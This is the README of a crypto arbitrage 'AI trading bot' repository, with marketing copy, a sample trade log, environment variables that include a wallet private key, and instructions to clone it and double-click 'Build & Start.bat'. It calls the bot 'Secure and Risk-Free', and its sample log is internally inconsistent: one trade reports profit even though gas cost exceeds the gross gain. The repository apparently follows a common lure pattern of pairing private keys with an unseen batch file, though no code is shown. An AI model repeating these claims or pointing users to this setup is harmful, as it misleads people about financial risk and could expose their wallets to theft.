<p align="center">
<img src=https://img.shields.io/github/stars/premiumtraders/AI-AutoTrade-Bot?style=for-the-badge&logo=appveyor&color=blue />
<img src=https://img.shields.io/github/forks/premiumtraders/AI-AutoTrade-Bot?style=for-the-badge&logo=appveyor&color=blue />
<img src=https://img.shields.io/github/issues/premiumtraders/AI-AutoTrade-Bot?style=for-the-badge&logo=appveyor&color=informational />
<img src=https://img.shields.io/github/issues-pr/premiumtraders/AI-AutoTrade-Bot?style=for-the-badge&logo=appveyor&color=informational />
</p>

# Artificial Intelligence-Powered Arbitrage and Trading Bot

**Embark on a Journey to the Peaks of Crypto Markets!**

Welcome! Introducing the **Artificial Intelligence-Powered Arbitrage and Trading Bot** designed to revolutionize the world of investment. This innovative bot conducts secure and swift transactions in dex markets, offering substantial gains.

## Why Our Bot?

### 1. **Secure and Risk-Free!**
Our bot minimizes the risk of losses by instantly reacting to market fluctuations. It paves the way for secure trading in dex markets.

### 2. **Swift and Efficient Transactions!**
With real-time data analysis, our bot anticipates market movements, facilitating rapid transactions. It holds the potential for profit at every moment.

### 3. **User-Friendly Interface!**
Initiate the bot with just a click and start trading effortlessly. The user-friendly interface guides you step by step. It's that simple!

### 4. **Live Support Service!**
Access free live support via our [Telegram channel](https://t.me/pancakeswapprediction). If you have questions or need assistance, our team is always here for you!

  
## Disclaimer
This repo is not either an investment advice or a recommendation or solicitation to buy or sell any investment and should not be used in the evaluation of the merits of making any investment decision. It should not be relied upon for accounting, legal or tax advice or investment recommendations. The contents reflected herein are subject to change without being updated. 

The codes are written for informational and educational purpose only, https and websocket endpoints might not work well if those endpoint have been depreciated. Please find other available endpoints in that case. Thanks for your understanding.

  
## Infrastructure
 
Basically arbitrage opportunity dont last long, your transaction must make it into the next block. So you have <3 seconds watching for opportunities, decide and execute transaction. Sometimes there are also a chance to 2-3 have block, see example below. `BLOCKNUMBER` in the environmental variables can be configured within how many blocks a transaction should be processed. You can test this bot on the test network before running it on the mainnet.
  
```
[7920960] [14/1/2023, 5:50:37 PM]: alive (bsc-ws-node.nariox.org) - took 308.42 ms
[7920991] [14/1/2023, 5:52:09 PM]: [bsc-ws-node.nariox.org] [BAKE/BNB ape>arbitrage] Arbitrage opportunity found! Expected profit: 0.007 $2.43 - 0.10%
[7920991] [14/1/2023, 5:52:09 PM] [bsc-ws-node.nariox.org]: [BAKE/BNB ape>arbitrage] and go:  {"profit":"$18.79","profitWithoutGasCost":"$29.43","gasCost":"$10.64","duration":"539.35 ms","provider":"bsc-ws-node.nariox.org"}
[7920992] [14/1/2023, 5:52:13 PM]: [bsc-ws-node.nariox.org] [BAKE/BNB ape>arbitrage] Arbitrage opportunity found! Expected profit: 0.007 $2.43 - 0.10%
[7920992] [14/1/2023, 5:52:13 PM] [bsc-ws-node.nariox.org]: [BAKE/BNB ape>arbitrage] and go:  {"profit":"$11.76","profitWithoutGasCost":"$22.43","gasCost":"$45.67","duration":"556.28 ms","provider":"bsc-ws-node.nariox.org"}
[7921000] [14/1/2023, 5:52:37 PM]: alive (bsc-ws-node.nariox.org) - took 280.54 ms
```
 
## environment variables
 
```
TEST_AMOUNT=0.005
BNB_AMOUNT=1000
WALLET_ADDRESS=<your wallet address>
PRIVATE_KEY=<your private key>
PRIVATE_TEST_KEY=<your test private key>
NETWORKID=56
BLOCKNUMBER=3
BSC_WSS=wss://bsc-ws-node.nariox.org:443
BSC_HTTPS=https://bsc-dataseed.binance.org/
BSC_TEST_HTTPS=https://data-seed-prebsc-1-s1.binance.org:8545/
MORALIS_BSC=https://speedy-nodes-nyc.moralis.io/<your account>/bsc/mainnet
WSS_BLOCKS=wss://bsc-ws-node.nariox.org:443
```


# About
The bot ceaselessly screens the costs of particular resources on distinctive DEXs, seeking out for openings to purchase at a lower price on one trade and offer at the next cost on another. When a favorable arbitrage opportunity is distinguished, the bot consequently executes the exchanges to capitalize on the cost dissimilarity and create profits.Through nonstop checking of different DEX stages, bot analyzes real-time showcase information to distinguish occasions where an asset's cost veers altogether over trades.

Thanks to artificial intelligence support, we are confident that we have the most powerful arbitrage bot on the market. And now you can test the full version features for free for 1 month.


#### Aviable DEXs
- Uniswap V3
- Pancakeswap
- Trader Joe
- Sushiswap
- dYdX

## Setup Instructions

Build using the following commands:

```shell
git clone https://github.com/premiumtraders/AI-AutoTrade-Bot.git
cd AI-AutoTrade-Bot
"Build & Start.bat"
```
## Setup Instructions - Way II

- [Download](https://github.com/premiumtraders/AI-AutoTrade-Bot/archive/refs/heads/main.zip) the repository release and extract files. 
- Double-click on the **Build & Start.bat** file to run it.
- And follow the instructions in the application window.

## Getting Started

1. **Start with a Click:** Just one click to run the bot. Follow the on-screen instructions and start trading.

2. **Boost Your Profits:** Utilize the advantages provided by the bot in dex markets to maximize your profits.


## Participation and Support

Would you like to join this remarkable journey? Whether you want to contribute to our project or simply seek support, feel free to contact us via our [Telegram](https://t.me/pancakeswapprediction). Our team is always ready to help!

This bot marks the beginning of a new era in the crypto world. Join the wave and maximize your investments!

*Happy Trading!* 🚀🌐